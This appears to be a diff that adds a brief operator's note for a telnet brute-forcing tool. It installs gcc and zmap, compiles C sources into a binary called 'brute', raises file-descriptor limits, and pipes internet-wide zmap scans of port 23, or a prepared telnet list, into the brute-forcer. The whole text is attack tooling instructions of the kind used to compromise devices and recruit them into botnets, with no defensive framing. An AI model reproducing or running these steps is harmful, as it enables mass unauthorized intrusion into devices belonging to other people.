@@ -1,0 +1,7 @@
+yum install gcc -y
+yum install zmap -y
+---------------------------------------------
+1)   gcc *.c -obrute -pthread -std=c99
+2)   ulimit -n 999999
+3)   zmap -p23 -q | ./brute 1
+4)   zmap -p23 -w telnet.list -q | ./brute 2
